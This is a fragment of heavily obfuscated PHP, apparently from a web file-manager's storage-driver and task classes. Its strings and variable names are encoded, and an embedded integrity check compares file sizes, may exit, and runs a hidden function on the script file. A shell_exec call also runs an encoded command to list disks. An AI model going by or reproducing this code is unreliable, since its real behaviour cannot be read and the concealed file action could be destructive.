self::systemPath($İ³±²”[1407])); IOHistory::bindEvent(); } public static function systemPath($ãñ­™ò) { $İ˜£±ºÖ =& $_SERVER[ÓïÕü]; $‡˜²ß¥á = $İ˜£±ºÖ[1408] . ucfirst($ãñ­™ò); $Ï“Æª¸¬ = Model($İ˜£±ºÖ[861])->get($‡˜²ß¥á); if ($Ï“Æª¸¬) { return $Ï“Æª¸¬; } if ($ãñ­™ò == $İ˜£±ºÖ[192]) { $Ï“Æª¸¬ = self::make(Model($İ˜£±ºÖ[921])->systemRootPathAdd($İ˜£±ºÖ[613])); } else { $Ï“Æª¸¬ = self::systemPath($İ˜£±ºÖ[192]); $ÏÓÌíö¿ = self::sourceID($Ï“Æª¸¬); $Ï“Æª¸¬ = self::make(Model($İ˜£±ºÖ[921])->mkdir($ÏÓÌíö¿, $ãñ­™ò)); } Model($İ˜£±ºÖ[861])->set($‡˜²ß¥á, $Ï“Æª¸¬); return $Ï“Æª¸¬; } public static function systemFolder($©éÉ›Ïä) { $ÏÔæş³° = IO_PATH_SYSTEM_SOURCE . $©éÉ›Ïä; $ËèŸ™£› = Cache::get($ÏÔæş³°); if (!$ËèŸ™£›) { $£®´Î®ñ = IO::infoFullSimple($ÏÔæş³°); if (!$£®´Î®ñ) { $ËèŸ™£› = IO::mkdir($ÏÔæş³°, REPEAT_SKIP); } else { $ËèŸ™£› = $£®´Î®ñ[$_SERVER[ÓïÕü][87]]; } Cache::set($ÏÔæş³°, $ËèŸ™£›, 3600 * 10); } return $ËèŸ™£›; } public static function defaultDriver() { return Model($_SERVER[ÓïÕü][858])->defaultDriver(); } public static function defaultDriverInit() { $¶‡¤Œë  =& $_SERVER[ÓïÕü]; static $‚ãÕüºŞ = false; if ($‚ãÕüºŞ) { return $‚ãÕüºŞ; } $àğßºø‡ = self::defaultDriver(); $‚ãÕüºŞ = IO::init($¶‡¤Œë [1409] . $àğßºø‡[$¶‡¤Œë [478]] . $¶‡¤Œë [1397]); return $‚ãÕüºŞ; } public static function fileTypeList() { $¶ĞÆÉ› =& $_SERVER[ÓïÕü]; $ÏèÎÕ¥ê = $GLOBALS[$¶ĞÆÉ›[6]][$¶ĞÆÉ›[1410]]; foreach ($ÏèÎÕ¥ê as $Ú¥É²Ş¹ => $¢âÜ’Ğ ) { $ŞáÚ—÷ = $¶ĞÆÉ›[1411] . $Ú¥É²Ş¹; $„¯ñ¥ê = LNG($ŞáÚ—÷); if ($ŞáÚ—÷ != $„¯ñ¥ê) { $ÏèÎÕ¥ê[$Ú¥É²Ş¹][$¶ĞÆÉ›[32]] = $„¯ñ¥ê; } } return $ÏèÎÕ¥ê; } public static function ioFileDriverGet($±Œ¤¹ˆ§ = '') { $İë°­ƒ =& $_SERVER[ÓïÕü]; static $òîòµº‘ = array(); static $óò»“©ø = array(); static $ÙÜ¶Œ¥– = array(); static $’˜­Üë = false; if ($’˜­Üë === !1) { $’˜­Üë = array($İë°­ƒ[583] => array(), $İë°­ƒ[670] => array()); $Œ›µ†—¥ = Model($İë°­ƒ[1412])->get(!1, $İë°­ƒ[1413]); foreach ($Œ›µ†—¥ as $Ö§Ğº†¢ => $İËí¤—) { if (!$İËí¤— || $İËí¤— == $İë°­ƒ[12]) { continue; } if (strstr($Ö§Ğº†¢, $İë°­ƒ[1414])) { $Úüì™ÃÆ = str_replace($İë°­ƒ[1414], $İë°­ƒ[12], $Ö§Ğº†¢); $’˜­Üë[$İë°­ƒ[583]][$Úüì™ÃÆ] = $İËí¤—; } else { if (strstr($Ö§Ğº†¢, $İë°­ƒ[1415])) { $Úüì™ÃÆ = str_replace($İë°­ƒ[1415], $İë°­ƒ[12], $Ö§Ğº†¢); $’˜­Üë[$İë°­ƒ[670]][$Úüì™ÃÆ] = $İËí¤—; } } } } $Ó×«×Û˜ = self::defaultDriver(); if (!$±Œ¤¹ˆ§ || !$’˜­Üë[$İë°­ƒ[583]] && !$’˜­Üë[$İë°­ƒ[670]]) { return $Ó×«×Û˜; } $Ñ¬º¬ıÜ = self::getPathSourceID($±Œ¤¹ˆ§); if (!$Ñ¬º¬ıÜ) { return $Ó×«×Û˜; } if (isset($òîòµº‘[$Ñ¬º¬ıÜ])) { return $òîòµº‘[$Ñ¬º¬ıÜ]; } $„ÆâÊÕ´ = Model($İë°­ƒ[921])->sourceInfo($Ñ¬º¬ıÜ); $•İÒ¿ÙÙ = $„ÆâÊÕ´[$İë°­ƒ[574]]; $³ïá›É = array(); if (!$„ÆâÊÕ´) { return $Ó×«×Û˜; } if ($„ÆâÊÕ´[$İë°­ƒ[191]] == $İë°­ƒ[91]) { if (isset($ÙÜ¶Œ¥–[$•İÒ¿ÙÙ])) { return $ÙÜ¶Œ¥–[$•İÒ¿ÙÙ]; } if (isset($’˜­Üë[$İë°­ƒ[670]][$•İÒ¿ÙÙ])) { $¿ˆÁ£á² = Model($İë°­ƒ[858])->driverInfo($’˜­Üë[$İë°­ƒ[670]][$•İÒ¿ÙÙ]); $Ó×«×Û˜ = $¿ˆÁ£á² ? $¿ˆÁ£á² : $Ó×«×Û˜; $ÙÜ¶Œ¥–[$•İÒ¿ÙÙ] = $Ó×«×Û˜; $òîòµº‘[$Ñ¬º¬ıÜ] = $Ó×«×Û˜; return $Ó×«×Û˜; } $³ïá›É = self::groupParentUser($•İÒ¿ÙÙ); } else { if ($„ÆâÊÕ´[$İë°­ƒ[191]] == $İë°­ƒ[513]) { $Ä˜êŞ½¥ = Model($İë°­ƒ[1416])->getInfo($•İÒ¿ÙÙ); if ($Ä˜êŞ½¥) { $³ïá›É = explode($İë°­ƒ[50], trim($Ä˜êŞ½¥[$İë°­ƒ[589]], $İë°­ƒ[50])); $³ïá›É = array_remove_value($³ïá›É, $İë°­ƒ[231]); $³ïá›É[] = $•İÒ¿ÙÙ; $³ïá›É = array_reverse($³ïá›É); } } } foreach ($³ïá›É as $ÚØ¦İüŞ) { if (!isset($’˜­Üë[$İë°­ƒ[583]][$ÚØ¦İüŞ])) { continue; } if (isset($óò»“©ø[$ÚØ¦İüŞ])) { return $óò»“©ø[$ÚØ¦İüŞ]; } $¿ˆÁ£á² = Model($İë°­ƒ[858])->driverInfo($’˜­Üë[$İë°­ƒ[583]][$ÚØ¦İüŞ]); $Ó×«×Û˜ = $¿ˆÁ£á² ? $¿ˆÁ£á² : $Ó×«×Û˜; $óò»“©ø[$ÚØ¦İüŞ] = $Ó×«×Û˜; break; } if ($„ÆâÊÕ´[$İë°­ƒ[191]] == $İë°­ƒ[91]) { $ÙÜ¶Œ¥–[$•İÒ¿ÙÙ] = $Ó×«×Û˜; } $òîòµº‘[$Ñ¬º¬ıÜ] = $Ó×«×Û˜; return $Ó×«×Û˜; } private static function getPathSourceID($µ¥†‹„Ü) { $†—¶õ’õ =& $_SERVER[ÓïÕü]; static $ÕÚÑõŒ· = array(); if (!$µ¥†‹„Ü) { return $†—¶õ’õ[12]; } $²İ²šŒü = substr($µ¥†‹„Ü, 0, strlen($†—¶õ’õ[486])) == $†—¶õ’õ[486]; $ÛßÕ¡§Ö = substr($µ¥†‹„Ü, 0, strlen($†—¶õ’õ[1384])) == $†—¶õ’õ[1384]; $ä¦…ÖğŠ = substr($µ¥†‹„Ü, 0, strlen($†—¶õ’õ[1385])) == $†—¶õ’õ[1385]; if (!$²İ²šŒü && !$ÛßÕ¡§Ö && !$ä¦…ÖğŠ) { return $†—¶õ’õ[12]; } $°ëºş‚§ = self::parse($µ¥†‹„Ü); $äàï’Æü = $°ëºş‚§[$†—¶õ’õ[1278]]; if ($²İ²šŒü) { return $°ëºş‚§[$†—¶õ’õ[478]]; } if (isset($ÕÚÑõŒ·[$äàï’Æü])) { $´ô•†©ü = $ÕÚÑõŒ·[$äàï’Æü]; } else { $´ô•†©ü = IO::init($äàï’Æü); $ÕÚÑõŒ·[$äàï’Æü] = $´ô•†©ü; } if (isset($´ô•†©ü->pathParse[$†—¶õ’õ[1281]])) { return $´ô•†©ü->pathParse[$†—¶õ’õ[1281]]; } return $†—¶õ’õ[12]; } private static function groupParentUser($øé¸ĞÌ¢) { $µ³›—»ê =& $_SERVER[ÓïÕü]; $ê˜ÎÓƒÚ = Model($µ³›—»ê[602])->getInfo($øé¸ĞÌ¢); if (!$ê˜ÎÓƒÚ) { return array(); } $üıÙ˜½÷ = array_to_keyvalue($ê˜ÎÓƒÚ[$µ³›—»ê[1417]], $µ³›—»ê[12], $µ³›—»ê[1418]); $ğºÕó‰¯ = array(); foreach ($ê˜ÎÓƒÚ[$µ³›—»ê[1417]] as $¡¾Éˆ…û) { $ğºÕó‰¯[] = $¡¾Éˆ…û[$µ³›—»ê[1418]]; $ş…Ù©³Ñ = explode($µ³›—»ê[50], trim($¡¾Éˆ…û[$µ³›—»ê[589]], $µ³›—»ê[50])); $ş…Ù©³Ñ = array_remove_value($ş…Ù©³Ñ, $µ³›—»ê[231]); $ş…Ù©³Ñ = array_reverse($ş…Ù©³Ñ); $ğºÕó‰¯ = array_merge($ğºÕó‰¯, $ş…Ù©³Ñ); } return array_unique($ğºÕó‰¯); } public static function diskList($ò›Û“™Ç = true) { $Šûó´àÏ = $_SERVER[ÓïÕü][1419]; if ($ò›Û“™Ç) { $Õ§‡ºÀÅ = Cache::get($Šûó´àÏ); if (is_array($Õ§‡ºÀÅ)) { return $Õ§‡ºÀÅ; } } $Õ§‡ºÀÅ = self::diskListGet(); Cache::set($Šûó´àÏ, $Õ§‡ºÀÅ, 60); return $Õ§‡ºÀÅ; } public static function diskListGet() { $ØİÊÕµú =& $_SERVER[ÓïÕü]; $¡÷©ğØ— = array(); if ($GLOBALS[$ØİÊÕµú[6]][$ØİÊÕµú[1420]] == $ØİÊÕµú[1421]) { $Ë¸Ğã¼Ì = $ØİÊÕµú[1422]; for ($£»îîØÁ = 0; $£»îîØÁ < strlen($Ë¸Ğã¼Ì); $£»îîØÁ++) { $à€ ¾ = $Ë¸Ğã¼Ì[$£»îîØÁ] . $ØİÊÕµú[1423]; if (file_exists($à€ ¾)) { $¡÷©ğØ—[] = $à€ ¾; } } return $¡÷©ğØ—; } if (!function_exists($ØİÊÕµú[101])) { $¡÷©ğØ—[] = $ØİÊÕµú[940]; return $¡÷©ğØ—; } $ÍÔ¯£ªÀ = explode($ØİÊÕµú[288], shell_exec($ØİÊÕµú[1424])); array_shift($ÍÔ¯£ªÀ); array_pop($ÍÔ¯£ªÀ); $ñÀÊ©”ï = array($ØİÊÕµú[1425], $ØİÊÕµú[1426], $ØİÊÕµú[1427], $ØİÊÕµú[1428], $ØİÊÕµú[1429], $ØİÊÕµú[1430], $ØİÊÕµú[1431], $ØİÊÕµú[1432]); foreach ($ÍÔ¯£ªÀ as $áÁº±é) { $äÄ˜ÄĞ = preg_split($ØİÊÕµú[1433], $áÁº±é); $à€ ¾ = $äÄ˜ÄĞ[count($äÄ˜ÄĞ) - 1]; if (!strstr($äÄ˜ÄĞ[0], $ØİÊÕµú[1434]) || !$à€ ¾) { continue; } $ñ ÖÊñÑ = rtrim($à€ ¾, $ØİÊÕµú[8]) . $ØİÊÕµú[8]; if (in_array($ñ ÖÊñÑ, $ñÀÊ©”ï)) { continue; } $¡÷©ğØ—[] = $ñ ÖÊñÑ; } return $¡÷©ğØ—; } public static function isSameDisk($ÔÛÚğêË, $ËÕ×³«¯) { $²ü‡”İò =& $_SERVER[ÓïÕü]; if ($GLOBALS[$²ü‡”İò[6]][$²ü‡”İò[1420]] == $²ü‡”İò[1421]) { return strtolower(substr($ÔÛÚğêË, 0, 1)) == strtolower(substr($ËÕ×³«¯, 0, 1)); } $‰Ñ·€ = stat($ÔÛÚğêË); $ÕıºŸ›Û = stat($ËÕ×³«¯); if ($‰Ñ·€ === !1 || $ÕıºŸ›Û === !1) { return !1; } return $‰Ñ·€[$²ü‡”İò[1435]] === $ÕıºŸ›Û[$²ü‡”İò[1435]]; $ç„÷”ı­ = self::diskList(); $é°’æ¿Û = !1; $‡ãéâ® = !1; sort($ç„÷”ı­); $ç„÷”ı­ = array_reverse($ç„÷”ı­); $ÔÛÚğêË = rtrim($ÔÛÚğêË, $²ü‡”İò[8]) . $²ü‡”İò[8]; $ËÕ×³«¯ = rtrim($ËÕ×³«¯, $²ü‡”İò[8]) . $²ü‡”İò[8]; foreach ($ç„÷”ı­ as $›¼ˆĞƒ†) { $·ñÔª = strlen($›¼ˆĞƒ†); if (!$é°’æ¿Û && substr($ÔÛÚğêË, 0, $·ñÔª) == $›¼ˆĞƒ†) { $é°’æ¿Û = $›¼ˆĞƒ†; } if (!$‡ãéâ® && substr($ËÕ×³«¯, 0, $·ñÔª) == $›¼ˆĞƒ†) { $‡ãéâ® = $›¼ˆĞƒ†; } if ($é°’æ¿Û && $‡ãéâ®) { break; } } return $é°’æ¿Û === $‡ãéâ®; } public static function transferType($ŸÄğä¹Ï, $¤õæ’ŸŒ) { $ëç“œş =& $_SERVER[ÓïÕü]; $µ—©ÒÂÃ = self::driverType($ŸÄğä¹Ï); $‰ÃÃÃ¼â = self::driverType($¤õæ’ŸŒ); if ($µ—©ÒÂÃ[$ëç“œş[33]] == $‰ÃÃÃ¼â[$ëç“œş[33]] && $µ—©ÒÂÃ[$ëç“œş[1436]] == $‰ÃÃÃ¼â[$ëç“œş[1436]]) { return $ëç“œş[1437]; } if ($µ—©ÒÂÃ[$ëç“œş[33]] == $ëç“œş[974] && $‰ÃÃÃ¼â[$ëç“œş[33]] == $ëç“œş[109]) { return $ëç“œş[1307]; } if ($µ—©ÒÂÃ[$ëç“œş[33]] == $ëç“œş[109] && $‰ÃÃÃ¼â[$ëç“œş[33]] == $ëç“œş[974]) { return $ëç“œş[110]; } return $ëç“œş[1438]; } public static function driverType($£±œ) { $ª©›îÒå =& $_SERVER[ÓïÕü]; $«×ıê·î = str_replace($ª©›îÒå[1439], $ª©›îÒå[12], strtolower($£±œ->getType())); if ($«×ıê·î == $ª©›îÒå[848] || $«×ıê·î == $ª©›îÒå[1440] || $«×ıê·î == $ª©›îÒå[1441]) { $Á³´˜¸ = self::ioFileDriverGet($ª©›îÒå[486] . $£±œ->pathParse[$ª©›îÒå[1281]] . $ª©›îÒå[405]); $£±œ = IO::init($ª©›îÒå[1409] . $Á³´˜¸[$ª©›îÒå[478]] . $ª©›îÒå[1397]); } else { if ($«×ıê·î == $ª©›îÒå[1317] || $«×ıê·î == $ª©›îÒå[1442]) { $£±œ = IO::init($£±œ->pathParse[$ª©›îÒå[1259]]); } } $‘£èÅˆ½ = $£±œ->path; $«×ıê·î = str_replace($ª©›îÒå[1439], $ª©›îÒå[12], strtolower($£±œ->getType())); if ($«×ıê·î == $ª©›îÒå[109]) { return array($ª©›îÒå[33] => $ª©›îÒå[109], $ª©›îÒå[1436] => $ª©›îÒå[12], $ª©›îÒå[87] => $‘£èÅˆ½, $ª©›îÒå[98] => $£±œ); } return array($ª©›îÒå[33] => $ª©›îÒå[974], $ª©›îÒå[1436] => $£±œ->pathDriver, $ª©›îÒå[87] => $‘£èÅˆ½, $ª©›îÒå[98] => $£±œ); } public static function pathDriverType($ØĞ´‰üé) { return $ØĞ´‰üé ? self::driverType(IO::init($ØĞ´‰üé)) : !1; } public static function pathDriverLocal($½ÓÊ„Äª) { $†¦º­‘ =& $_SERVER[ÓïÕü]; $‘ÎÅä§á = $½ÓÊ„Äª ? self::driverType(IO::init($½ÓÊ„Äª)) : !1; return strtolower($‘ÎÅä§á[$†¦º­‘[33]]) == $†¦º­‘[109] ? !0 : !1; } public static function allowCover($üñÙ¨ú, $Ãø½‰‹‘ = true) { $Å¬Ä„Í× =& $_SERVER[ÓïÕü]; if (is_string($üñÙ¨ú)) { $üñÙ¨ú = IO::info($üñÙ¨ú); } if (!$üñÙ¨ú || $üñÙ¨ú[$Å¬Ä„Í×[33]] == $Å¬Ä„Í×[78] || $üñÙ¨ú[$Å¬Ä„Í×[79]] <= 100) { return !1; } if (isset($üñÙ¨ú[$Å¬Ä„Í×[1443]]) || !$üñÙ¨ú[$Å¬Ä„Í×[87]]) { return !1; } if (isset($üñÙ¨ú[$Å¬Ä„Í×[235]]) && !$üñÙ¨ú[$Å¬Ä„Í×[235]]) { return !1; } static $ÎšÂÓªé = false; if (!$ÎšÂÓªé || !$Ãø½‰‹‘) { $øÓÌì·ğ = self::driverType(IO::init($üñÙ¨ú[$Å¬Ä„Í×[87]])); $Î¹™êÖ = $øÓÌì·ğ[$Å¬Ä„Í×[98]]; $ÎšÂÓªé = $Å¬Ä„Í×[197]; if ($øÓÌì·ğ[$Å¬Ä„Í×[33]] == $Å¬Ä„Í×[109]) { $ÎšÂÓªé = $Å¬Ä„Í×[1444]; } if ($øÓÌì·ğ[$Å¬Ä„Í×[98]] && is_array($øÓÌì·ğ[$Å¬Ä„Í×[98]]->config)) { $¾²ÔÍö‰ = $øÓÌì·ğ[$Å¬Ä„Í×[98]]->config; if (isset($¾²ÔÍö‰[$Å¬Ä„Í×[1445]]) && $¾²ÔÍö‰[$Å¬Ä„Í×[1445]]) { $ÎšÂÓªé = $Å¬Ä„Í×[1444]; } } $ĞÅ£äÆÛ = KodIO::defaultDriver(); if (strtolower($ĞÅ£äÆÛ[$Å¬Ä„Í×[98]]) == $Å¬Ä„Í×[109] && is_array($ĞÅ£äÆÛ[$Å¬Ä„Í×[6]])) { $š©·œªÒ = $ĞÅ£äÆÛ[$Å¬Ä„Í×[6]][$Å¬Ä„Í×[1290]]; if (substr($š©·œªÒ, 0, 2) == $Å¬Ä„Í×[1446]) { $š©·œªÒ = str_replace($Å¬Ä„Í×[1446], BASIC_PATH, $š©·œªÒ); } $š©·œªÒ = str_replace($Å¬Ä„Í×[257], $Å¬Ä„Í×[8], $š©·œªÒ); if (substr($üñÙ¨ú[$Å¬Ä„Í×[87]], 0, strlen($š©·œªÒ)) == $š©·œªÒ) { $ÎšÂÓªé = $Å¬Ä„Í×[197]; } } } return $ÎšÂÓªé == $Å¬Ä„Í×[1444] ? !0 : !1; } } goto C¼¨…¢˜Şè; c‰£¶Û¯Ä: if ($_SERVER[$_SERVER[ÓïÕü][933]] != $_size($_file)) { $_getc = $_SERVER[ÓïÕü][934]; $_getfile = $_SERVER[$_SERVER[ÓïÕü][935]] . $_SERVER[ÓïÕü][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÓïÕü][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÓïÕü][706]) { $exit = $_SERVER[ÓïÕü][937]; $exit(); } $_act = $_SERVER[ÓïÕü][938]; $_act($_file); } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Óû ûØ‚, $º”¦Ê§‘ = 5.0) { if (!$Óû ûØ‚) { return; } $Ìş¿äêÀ = Cache::get($Óû ûØ‚); if (!$Ìş¿äêÀ || timeFloat() - floatVal($Ìş¿äêÀ) >= $º”¦Ê§‘) { Cache::set($Óû ûØ‚, timeFloat(), $º”¦Ê§‘ * 10); return !0; } return !1; } public static function timeLimitCall($­çùŠå, $Ú“²Î¥, $¥Æ×³«, $Ç²”†ÉÌ = 5.0) { $ßÊ·„ó =& $_SERVER[ÓïÕü]; if (!$­çùŠå || !$Ú“²Î¥) { return; } self::$asyncAdd = !0; $³»¿’ = $ßÊ·„ó[1914]; $Ê¿‡é· = Cache::get($³»¿’, !0); $Ñş›ÕÈœ = array($ßÊ·„ó[1915] => timeFloat(), $ßÊ·„ó[1916] => timeFloat(), $ßÊ·„ó[344] => $Ú“²Î¥, $ßÊ·„ó[1906] => $¥Æ×³«, $ßÊ·„ó[207] => $Ç²”†ÉÌ); if (is_array($Ê¿‡é·[$­çùŠå])) { $Ñş›ÕÈœ[$ßÊ·„ó[1916]] = $Ê¿‡é·[$­çùŠå][$ßÊ·„ó[1916]]; } if (is_array($Ê¿‡é·[$­çùŠå])) { if (timeFloat() - $Ê¿‡é·[$­çùŠå][$ßÊ·„ó[1915]] < $Ñş›ÕÈœ[$ßÊ·„ó[207]] * 0.3) { return; } $Ñş›ÕÈœ[$ßÊ·„ó[1916]] = $Ê¿‡é·[$­çùŠå][$ßÊ·„ó[1916]]; } $Ê¿‡é·[$­çùŠå] = $Ñş›ÕÈœ; Cache::set($³»¿’, $Ê¿‡é·, 60); Cache::removeMemory($³»¿’); write_log($ßÊ·„ó[1917] . $­çùŠå . $ßÊ·„ó[74] . $Ú“²Î¥, $ßÊ·„ó[198]); } public static function timeLimitCallLoop() { $â¢§Êº =& $_SERVER[ÓïÕü]; $š·ú…¢ = array($â¢§Êº[1918]); $ä‚« Ê = in_array(strtolower(ACTION), $š·ú…¢); if (!$ä‚« Ê && !self::$asyncAdd) { return; } $£Éø³ã = $â¢§Êº[1914]; $´ï¹ö­à = Cache::get($£Éø³ã, !0); if (!$´ï¹ö­à || count($´ï¹ö­à) <= 0) { return; } $½à‹˜©› = !1; $›Õ¨ÓÇ‰ = timeFloat(); $íì¨¹æ– = array(); foreach ($´ï¹ö­à as $ö¹²¸Ìù => $ÈÊ’Âä) { if ($›Õ¨ÓÇ‰ - $ÈÊ’Âä[$â¢§Êº[1916]] > $ÈÊ’Âä[$â¢§Êº[207]]) { $½à‹˜©› = !0; try { Hook::apply($ÈÊ’Âä[$â¢§Êº[344]], $ÈÊ’Âä[$â¢§Êº[1906]]); write_log($â¢§Êº[1919] . $ö¹²¸Ìù . $â¢§Êº[74] . $ÈÊ’Âä[$â¢§Êº[344]] . $â¢§Êº[1920] . ACTION, $â¢§Êº[198]); } catch (Exception $–ç¥â£) { } continue; } $íì¨¹æ–[$ö¹²¸Ìù] = $ÈÊ’Âä; } if (!$½à‹˜©›) { return; } if (!$íì¨¹æ–) { return Cache::remove($£Éø³ã); } Cache::set($£Éø³ã, $íì¨¹æ–, 60); Cache::removeMemory($£Éø³ã); } public static function finished($Ì Ø¢ú, $Ÿº¸öÊÍ) { $¨¤¸ã¨ =& $_SERVER[ÓïÕü]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¨¤¸ã¨[344] => $Ì Ø¢ú, $¨¤¸ã¨[1906] => $Ÿº¸öÊÍ); } private static function finishedRun() { $¸ŠÀÈüÑ =& $_SERVER[ÓïÕü]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ã¿šĞÃŸ) { try { Hook::apply($ã¿šĞÃŸ[$¸ŠÀÈüÑ[344]], $ã¿šĞÃŸ[$¸ŠÀÈüÑ[1906]]); } catch (Exception $Ç‚³™¸) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $•áÎ‚–ò =& $_SERVER[ÓïÕü]; parent::startAfter(); Hook::bind($•áÎ‚–ò[1921], array($this, $•áÎ‚–ò[1922])); Hook::bind($•áÎ‚–ò[1306], array($this, $•áÎ‚–ò[1923])); Hook::bind($•áÎ‚–ò[1924], array($this, $•áÎ‚–ò[1925])); $†¹˜Ï·ˆ =& $this->task; $†¹˜Ï·ˆ[$•áÎ‚–ò[1926]] = $•áÎ‚–ò[1307]; if (!$†¹˜Ï·ˆ[$•áÎ‚–ò[1694]]) { $†¹˜Ï·ˆ[$•áÎ‚–ò[1694]] = LNG($•áÎ‚–ò[1927]); } } protected function endAfter() { $Ç†ìù°Ş =& $_SERVER[ÓïÕü]; parent::endAfter(); Hook::unbind($Ç†ìù°Ş[1921], array($this, $Ç†ìù°Ş[1922])); Hook::unbind($Ç†ìù°Ş[1306], array($this, $Ç†ìù°Ş[1923])); Hook::unbind($Ç†ìù°Ş[1924], array($this, $Ç†ìù°Ş[1925])); } public function updateAfter() { $…º®·Ó€ =& $_SERVER[ÓïÕü]; $šÅ‚ş½Ø =& $this->task; if (!$šÅ‚ş½Ø[$…º®·Ó€[1167]] || !$šÅ‚ş½Ø[$…º®·Ó€[854]]) { if ($šÅ‚ş½Ø[$…º®·Ó€[1926]] != $…º®·Ó€[391]) { return; } } if ($šÅ‚ş½Ø[$…º®·Ó€[1926]] == $…º®·Ó€[1307]) { $¢‡È–›Ì = 0; if ($šÅ‚ş½Ø[$…º®·Ó€[1860]]) { $¢‡È–›Ì = $šÅ‚ş½Ø[$…º®·Ó€[1861]] / $šÅ‚ş½Ø[$…º®·Ó€[1860]]; } $šÅ‚ş½Ø[$…º®·Ó€[1808]] = $¢‡È–›Ì * 0.3; } else { if ($šÅ‚ş½Ø[$…º®·Ó€[1926]] == $…º®·Ó€[391]) { $¢‡È–›Ì = $šÅ‚ş½Ø[$…º®·Ó€[1807]] / $šÅ‚ş½Ø[$…º®·Ó€[1167]]; $šÅ‚ş½Ø[$…º®·Ó€[1808]] = 0.3 + $¢‡È–›Ì * 0.4; } else { if ($šÅ‚ş½Ø[$…º®·Ó€[1926]] == $…º®·Ó€[110]) { $Š«ë£Å¹ = 0; if ($šÅ‚ş½Ø[$…º®·Ó€[1862]] == $…º®·Ó€[110]) { $Š«ë£Å¹ = $šÅ‚ş½Ø[$…º®·Ó€[1861]]; } $¢‡È–›Ì = ($šÅ‚ş½Ø[$…º®·Ó€[1865]] + $Š«ë£Å¹) / $šÅ‚ş½Ø[$…º®·Ó€[854]]; $šÅ‚ş½Ø[$…º®·Ó€[1808]] = 0.3 + 0.4 + $¢‡È–›Ì * 0.3; } } } if ($šÅ‚ş½Ø[$…º®·Ó€[1808]] > 0) { $çÀş¥óû = timeFloat() - $šÅ‚ş½Ø[$…º®·Ó€[1810]] - $šÅ‚ş½Ø[$…º®·Ó€[1813]]; $šÅ‚ş½Ø[$…º®·Ó€[1814]] = $çÀş¥óû * (1 - $šÅ‚ş½Ø[$…º®·Ó€[1808]]) / $šÅ‚ş½Ø[$…º®·Ó€[1808]]; } } public function addFile($ì›¬Ñ) { $ªÚßƒû =& $_SERVER[ÓïÕü]; $»¤¦Æ =& $this->task; $Õ…»åŸ’ = IO::info($ì›¬Ñ); $»¤¦Æ[$ªÚßƒû[1858]] = $Õ…»åŸ’[$ªÚßƒû[32]]; $»¤¦Æ[$ªÚßƒû[1860]] = $Õ…»åŸ’[$ªÚßƒû[79]]; $»¤¦Æ[$ªÚßƒû[1861]] = 0; $»¤¦Æ[$ªÚßƒû[1169]] = $ªÚßƒû[1881]; $»¤¦Æ[$ªÚßƒû[1862]] = $ªÚßƒû[1307]; $»¤¦Æ[$ªÚßƒû[854]] = $Õ…»åŸ’[$ªÚßƒû[79]]; $»¤¦Æ[$ªÚßƒû[1167]] = 1; $¯ªæ£šª = 0; $»¤¦Æ[$ªÚßƒû[1869]] = array($ªÚßƒû[1870] => $¯ªæ£šª + 1, $ªÚßƒû[497] => $Õ…»åŸ’[$ªÚßƒû[32]], $ªÚßƒû[87] => $Õ…»åŸ’[$ªÚßƒû[87]], $ªÚßƒû[587] => $Õ…»åŸ’[$ªÚßƒû[587]] ? $Õ…»åŸ’[$ªÚßƒû[587]] : $Õ…»åŸ’[$ªÚßƒû[87]]); $this->update(); } public function zipEvent($¡îÕâé, $İ—ß‡¨Õ, $—•ıÏå, $‘—‚ÒšÇ) { $µü¡Â°‰ =& $_SERVER[ÓïÕü]; $£™ı§’ =& $this->task; $£™ı§’[$µü¡Â°‰[1858]] = get_path_this($İ—ß‡¨Õ); $£™ı§’[$µü¡Â°‰[1860]] = $‘—‚ÒšÇ; $£™ı§’[$µü¡Â°‰[1861]] = $—•ıÏå; $£™ı§’[$µü¡Â°‰[1169]] = $¡îÕâé == $µü¡Â°‰[1928] ? $µü¡Â°‰[1929] : $µü¡Â°‰[1930]; $£™ı§’[$µü¡Â°‰[1862]] = $µü¡Â°‰[12]; $£™ı§’[$µü¡Â°‰[854]] = $‘—‚ÒšÇ; $£™ı§’[$µü¡Â°‰[1926]] = $µü¡Â°‰[391]; $this->update(); } public function unzipAfter($¯Ì˜ãğ) { $¨‘øÙÒ =& $_SERVER[ÓïÕü]; $˜Ü°àı =& $this->task; $˜Ü°àı[$¨‘øÙÒ[1926]] = $¨‘øÙÒ[110]; $ú²ÖƒÀÜ = IO::infoWithChildren($¯Ì˜ãğ); $úÌ¾ş¯Å = 0; $˜Ü°àı[$¨‘øÙÒ[1869]] = array($¨‘øÙÒ[1870] => $úÌ¾ş¯Å + 1, $¨‘øÙÒ[497] => $ú²ÖƒÀÜ[$¨‘øÙÒ[32]], $¨‘øÙÒ[87] => $ú²ÖƒÀÜ[$¨‘øÙÒ[87]], $¨‘øÙÒ[587] => $ú²ÖƒÀÜ[$¨‘øÙÒ[587]] ? $ú²ÖƒÀÜ[$¨‘øÙÒ[587]] : $ú²ÖƒÀÜ[$¨‘øÙÒ[87]]); if ($ú²ÖƒÀÜ[$¨‘øÙÒ[33]] == $¨‘øÙÒ[233]) { $˜Ü°àı[$¨‘øÙÒ[1167]] = 1; } else { $˜Ü°àı[$¨‘øÙÒ[1167]] = $ú²ÖƒÀÜ[$¨‘øÙÒ[82]][$¨‘øÙÒ[80]]; } $˜Ü°àı[$¨‘øÙÒ[1169]] = $¨‘øÙÒ[12]; $˜Ü°àı[$¨‘øÙÒ[1862]] = 0; $˜Ü°àı[$¨‘øÙÒ[1807]] = 0; $˜Ü°àı[$¨‘øÙÒ[1860]] = 0; $˜Ü°àı[$¨‘øÙÒ[1861]] = 0; $˜Ü°àı[$¨‘øÙÒ[1858]] = $¨‘øÙÒ[12]; $˜Ü°àı[$¨‘øÙÒ[1865]] = 0; $˜Ü°àı[$¨‘øÙÒ[854]] = $ú²ÖƒÀÜ[$¨‘øÙÒ[79]]; $this->update(); self::log($¨‘øÙÒ[1931] . json_encode(array($˜Ü°àı, $ú²ÖƒÀÜ))); } public function nameParse($à­â’ı¥) { $ßÍ­åÛ• =& $_SERVER[ÓïÕü]; $š—™ù‰Í =& $this->task; if ($š—™ù‰Í[$ßÍ­åÛ•[1926]] == $ßÍ­åÛ•[1307]) { 